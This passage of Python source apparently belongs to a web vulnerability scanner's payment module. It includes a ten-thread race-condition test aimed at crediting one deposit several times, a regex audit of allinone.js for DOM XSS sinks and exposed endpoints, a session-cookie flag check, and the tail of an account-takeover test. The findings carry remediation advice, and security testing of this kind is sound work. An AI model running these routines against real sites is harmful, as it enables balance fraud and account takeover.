                                f"-> status=1, new_pass={data.get('new','')}"
                            ),
                            confirmed=True,
                            vuln_type="Authentication Bypass / Account Takeover",
                        ))
            except Exception:
                pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 13: Race condition on check_order — 10 parallel threads
    # If server credits balance per-response without locking, multi-credit possible
    # -----------------------------------------------------------------------

    def _test_race_condition(self, money_view_url: str, money_add_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing race condition on check_order...")

        order_id = None
        try:
            hist = self.http.get(f"{money_view_url}?get_history=1")
            if hist and hist.status_code == 200:
                for item in hist.json():
                    st = str(item.get("status", "")).lower()
                    if item.get("id") and st in ("opened", "wait payment", ""):
                        order_id = item["id"]
                        break
        except Exception:
            pass

        if not order_id:
            return findings

        results = []
        lock = threading.Lock()

        def fire():
            try:
                r = self.http.get(f"{money_view_url}?check_order={order_id}")
                if r:
                    with lock:
                        results.append(r.text.strip())
            except Exception:
                pass

        threads = [threading.Thread(target=fire) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=10)

        confirmed_count = results.count("1")
        if confirmed_count > 1:
            findings.append(Finding(
                title=f"Race Condition: check_order Confirmed {confirmed_count}x Simultaneously",
                severity="CRITICAL",
                owasp="A1:2021",
                cwe="CWE-362",
                cvss_score=9.0,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
                url=f"{money_view_url}?check_order={order_id}",
                parameter="check_order",
                payload=f"10 parallel requests, order_id={order_id}",
                description=(
                    f"10 simultaneous check_order requests returned '1' {confirmed_count} times. "
                    "Each '1' may trigger a balance credit — multiply any deposit value."
                ),
                impact="Balance inflation via race condition.",
                remediation=(
                    "Use DB row-locking (SELECT FOR UPDATE) when checking order status. "
                    "Implement idempotency keys. Use atomic compare-and-swap for status transitions."
                ),
                references=[
                    "https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control",
                    "https://portswigger.net/research/smashing-the-state-machine",
                ],
                evidence=f"10 threads -> {confirmed_count}x '1', {results.count('0')}x '0'",
                confirmed=True,
                vuln_type="Race Condition / Business Logic",
            ))

        return findings

    # -----------------------------------------------------------------------
    # TEST 14: Static analysis of allinone.js
    # Detect DOM XSS sinks, client-side-only validation, full endpoint map
    # -----------------------------------------------------------------------

    def _audit_allinone_js(self, js_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Auditing allinone.js...")

        try:
            r = self.http.get(js_url)
            if not r or r.status_code != 200:
                return findings

            js_code = r.text

            # DOM XSS: .html() / .append() with server data (item.*)
            xss_sinks = []
            for m in re.finditer(r"\.html\(.*?item\.", js_code):
                ctx = js_code[max(0, m.start() - 40):m.end() + 60].replace("\n", " ")
                xss_sinks.append(ctx)

            if xss_sinks:
                findings.append(Finding(
                    title="Potential DOM XSS: Unsanitized Server Data via .html()/.append()",
                    severity="HIGH",
                    owasp="A3:2021",
                    cwe="CWE-79",
                    cvss_score=7.4,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
                    url=js_url,
                    parameter="DOM sinks in allinone.js",
                    payload="Server item.* fields injected into .html()/.append()",
                    description=(
                        "allinone.js injects server-returned fields directly into the DOM via "
                        f".html()/.append() without encoding. Found {len(xss_sinks)} sink(s). "
                        "If server fields (city, bank, fname, etc.) contain attacker-controlled HTML "
                        "from card/seller data, this is stored XSS."
                    ),
                    impact="Stored XSS: attacker with seller access plants JS executing for all buyers.",
                    remediation="Replace .html() with .text() for untrusted data. HTML-encode all server values.",
                    references=["https://owasp.org/www-project-top-ten/2021/A03_2021-Injection"],
                    evidence="Sinks:\n" + "\n".join(xss_sinks[:3]),
                    confirmed=False,
                    vuln_type="DOM XSS",
                ))

            # Client-side-only validation
            client_checks = re.findall(
                r"\.val\(\).*===?\s*['\"]['\"]|parseInt|\.length\s*[<>]=?\s*\d",
                js_code,
            )
            if len(client_checks) > 3:
                findings.append(Finding(
                    title="Client-Side Input Validation Without Server-Side Enforcement",
                    severity="LOW",
                    owasp="A5:2021",
                    cwe="CWE-602",
                    cvss_score=3.1,
                    cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
                    url=js_url,
                    parameter="Multiple form fields",
                    payload="Bypass via direct HTTP (curl / Burp Suite)",
                    description=(
                        f"allinone.js contains {len(client_checks)} client-side checks "
                        "trivially bypassed by sending raw HTTP requests."
                    ),
                    impact="All JS-enforced constraints can be bypassed with direct requests.",
                    remediation="Replicate every validation rule server-side. Never trust client.",
                    references=["https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"],
                    evidence=f"Found {len(client_checks)} client-only checks in allinone.js",
                    confirmed=True,
                    vuln_type="Missing Server-Side Validation",
                ))

            # Full API endpoint inventory (informational)
            endpoints_found = sorted(set(re.findall(r"url:\s*['\"]([^'\"]+)['\"]", js_code)))
            findings.append(Finding(
                title="Full API Surface Enumerated from allinone.js (Informational)",
                severity="INFO",
                owasp="A5:2021",
                cwe="CWE-200",
                cvss_score=0.0,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
                url=js_url,
                parameter="N/A",
                payload="Static analysis",
                description=(
                    f"/components/js/allinone.js is publicly accessible and exposes "
                    f"{len(endpoints_found)} API endpoints without authentication."
                ),
                impact="Any attacker can map the full API before attacking.",
                remediation="Minify/obfuscate production JS. Implement auth on all endpoints.",
                references=["https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration"],
                evidence="Endpoints: " + ", ".join(endpoints_found),
                confirmed=True,
                vuln_type="Information Disclosure",
            ))

        except Exception as e:
            self.logger.debug(f"[payment] allinone.js audit error: {e}")

        return findings

    # -----------------------------------------------------------------------
    # TEST 15: PHP session cookie security flags
    # -----------------------------------------------------------------------

    def _test_session_fixation(self) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing PHP session security flags...")

        check_urls = [
            self.target + SITE_ENDPOINTS["money_add"],
            self.target + SITE_ENDPOINTS["cc_buy"],
            self.target + SITE_ENDPOINTS["cc_list"],
            self.target + SITE_ENDPOINTS["login"],
        ]

        issues = []
        for url in check_urls:
            try:
                r = self.http.get(url)
                if not r:
                    continue
                sc = r.headers.get("Set-Cookie", "")
                if "PHPSESSID" in sc or "phpsessid" in sc.lower():
                    if "HttpOnly" not in sc:
                        issues.append(f"{url}: PHPSESSID missing HttpOnly")
                    if "Secure" not in sc:
                        issues.append(f"{url}: PHPSESSID missing Secure flag")
                    if "SameSite" not in sc:
                        issues.append(f"{url}: PHPSESSID missing SameSite")
            except Exception:
                pass

        if issues:
            findings.append(Finding(
                title="PHP Session Cookie Missing Security Flags (HttpOnly/Secure/SameSite)",
                severity="MEDIUM",
                owasp="A2:2021",
                cwe="CWE-614",
                cvss_score=5.4,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
                url=check_urls[0],
                parameter="Set-Cookie: PHPSESSID",
                payload="Header analysis",
                description=(
                    "PHPSESSID is missing security flags, enabling session theft via XSS "
                    "or network interception.\n" + "\n".join(issues)
                ),
                impact="Session hijacking -> full account takeover.",
                remediation=(
                    "Set HttpOnly; Secure; SameSite=Strict on PHPSESSID. "
                    "php.ini: session.cookie_httponly=1, session.cookie_secure=1, "
                    "session.cookie_samesite=Strict."
                ),
                references=["https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures"],
                evidence="\n".join(issues),
                confirmed=True,
                vuln_type="Session Management",
            ))

        return findings
